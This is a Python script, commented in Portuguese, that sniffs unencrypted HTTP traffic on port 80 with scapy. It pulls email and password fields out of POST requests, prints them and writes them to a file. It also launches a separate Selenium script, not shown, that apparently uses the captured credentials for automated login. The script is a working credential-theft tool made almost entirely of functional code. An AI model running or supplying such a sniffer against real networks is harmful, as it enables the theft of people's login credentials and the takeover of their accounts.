import os
import sys
from scapy.all import sniff, Raw
from urllib.parse import unquote
import subprocess
import threading
import pwd

# Define caminhos absolutos para evitar erros no subprocesso
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
ARQUIVO_SAIDA = os.path.join(BASE_DIR, "captura.txt")
ARQUIVO_TEMP = os.path.join(BASE_DIR, "captura.tmp")

# Verifica se o modo oculto está ativo
HIDE_MODE = "-hide" in sys.argv

# Tente localizar o python do venv dinamicamente ou use o caminho fixo
if sys.prefix != sys.base_prefix:
    # Está rodando num venv
    python_exec = sys.executable
else:
    # Caminho manual caso não esteja ativo o venv no shell atual
    python_exec = os.path.join(BASE_DIR, ".venv/bin/python")

def get_demote_function():
    """
    Retorna uma função que configura o UID/GID para o usuário original
    que chamou o sudo. Isso impede que o Firefox rode como root.
    """
    uid = os.environ.get('SUDO_UID')
    gid = os.environ.get('SUDO_GID')

    if uid and gid:
        def demote():
            os.setgid(int(gid))
            os.setuid(int(uid))

        return demote
    return None

def monitorar_logs_selenium(proc):
    """ Corrige o bug visual de 'escada' nos logs """
    while True:
        line = proc.stdout.readline()
        if not line and proc.poll() is not None:
            break
        if line:
            texto = line.strip()
            if texto:
                sys.stdout.write(f"{texto}\r\n")
                sys.stdout.flush()

def salvar_credenciais(email, senha):
    """
    Escreve num arquivo temporário e renomeia.
    Isso evita que o Selenium leia o arquivo enquanto ele ainda está sendo escrito.
    """
    try:
        with open(ARQUIVO_TEMP, "w", encoding="utf-8") as f:
            f.write(f"{email} {senha}")
            f.flush()
            os.fsync(f.fileno())

        # A renomeação é atômica em sistemas POSIX (Linux/Mac)
        os.replace(ARQUIVO_TEMP, ARQUIVO_SAIDA)
        print(f"[disk] Credenciais salvas para automação: {email}")
    except Exception as e:
        print(f"[erro] Falha ao salvar credenciais: {e}")


def processar(pacote):
    if pacote.haslayer(Raw):
        try:
            data = pacote[Raw].load.decode(errors="ignore").lower()

            if "post" in data and ("email=" in data or "passwd=" in data):

                print("\n[🚨 DADOS CAPTURADOS 🚨]")
                print("-----------------------------------------")

                email = ""
                senha = ""

                if "email=" in data:
                    email_raw = data.split("email=", 1)[1].split("&")[0]
                    email = unquote(email_raw)
                    if HIDE_MODE:
                        sys.stdout.write(f"[EMAIL]  {'*' * 5} (OCULTO) {'*' * 5}\r\n")
                    else:
                        print(f"[EMAIL]  {email}")

                if "passwd=" in data:
                    pass_raw = data.split("passwd=", 1)[1].split("&")[0]
                    senha = unquote(pass_raw)
                    if HIDE_MODE:
                        sys.stdout.write(f"[PASSWD] {'*' * 5} (OCULTO) {'*' * 5}\r\n")
                    else:
                        print(f"[PASSWD] {senha}")

                # salva imediatamente no arquivo
                salvar_credenciais(email, senha)

                print("-----------------------------------------\n")

        except Exception as e:
            # print(e) # Descomente para debug
            pass


# --- INICIALIZAÇÃO ---
print(f"[*] Iniciando automação Selenium")
if HIDE_MODE:
    print("[*] MODO PRIVACIDADE ATIVO: Credenciais serão ocultadas nos logs.")
script_automacao = os.path.join(BASE_DIR, "selenium_automation.py")

# Prepara a função de downgrade de permissão
demote_fn = get_demote_function()

# --- CORREÇÃO CRÍTICA DE AMBIENTE (Fix /root/.wdm) ---
# Clona o ambiente atual e sobrescreve a HOME para a do usuário real
env_corrigido = os.environ.copy()
sudo_uid = os.environ.get('SUDO_UID')

if sudo_uid:
    try:
        # Busca dados do usuário real no sistema (/etc/passwd)
        dados_usuario = pwd.getpwuid(int(sudo_uid))
        home_usuario = dados_usuario.pw_dir
        nome_usuario = dados_usuario.pw_name

        # Força o Selenium a usar a Home correta (/home/anchor), não a do Root
        env_corrigido['HOME'] = home_usuario
        env_corrigido['USER'] = nome_usuario
        env_corrigido['LOGNAME'] = nome_usuario

        # Opcional: Remover variáveis específicas do Xauthority do root se causarem conflito
        # mas geralmente mudar a HOME é suficiente.
    except Exception as e:
        print(f"[!] Aviso: Não foi possível ajustar HOME do usuário: {e}")

cmd = [python_exec, "-u", script_automacao]
if HIDE_MODE:
    cmd.append("-hide")

proc = subprocess.Popen(
    cmd,
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True,
    bufsize=1,
    preexec_fn=demote_fn,
    cwd=BASE_DIR,
    env=env_corrigido
)

t = threading.Thread(target=monitorar_logs_selenium, args=(proc,), daemon=True)
t.start()

print("[*] Sniffer ativo. Aguardando POSTs...")
try:
    sniff(filter="tcp port 80", prn=processar, store=False)
except KeyboardInterrupt:
    print("\n[*] Encerrando...")
    proc.terminate()